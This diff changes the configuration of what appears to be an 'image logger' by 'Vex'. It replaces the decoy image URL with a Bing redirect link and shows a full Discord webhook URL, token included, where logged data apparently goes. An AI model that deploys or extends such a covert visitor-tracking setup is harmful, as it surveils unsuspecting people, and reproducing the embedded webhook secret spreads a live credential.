@@ -13,7 +13,7 @@ __author__ = "Vex"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1133846235036524564/VYaXMY4Bf1783rJgux7NINcJ6iqyWkzVxaBNsMqIBh7HFBAE0cNxai9ADmUGhHCqpLQF",
-    "image": "https://th.bing.com/th?id=OIP.tVBkCBTLIKqWlh-dr6H5tAHaIQ&w=141&h=158&c=8&rs=1&qlt=90&o=6&dpr=1.5&pid=3.1&rm=2", # You can also have a custom image by using a URL argument
+    "image": "https://www.bing.com/ck/a?!&&p=6c095eba11030831JmltdHM9MTY5MDMyOTYwMCZpZ3VpZD0yYzdkNTA4OS05MjcwLTY4MGMtM2RjYS00M2M2OTNkYjY5YzMmaW5zaWQ9NTQ3Mw&ptn=3&hsh=3&fclid=2c7d5089-9270-680c-3dca-43c693db69c3&u=a1L2ltYWdlcy9zZWFyY2g_cT0ucG5nK2ltYWdlcyZpZD0wNzNCOTA1ODRCMjE1OEREOTY3NDc0N0JCRjJBRDNBMjlGNzgxOTREJkZPUk09SVFGUkJB&ntb=1", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
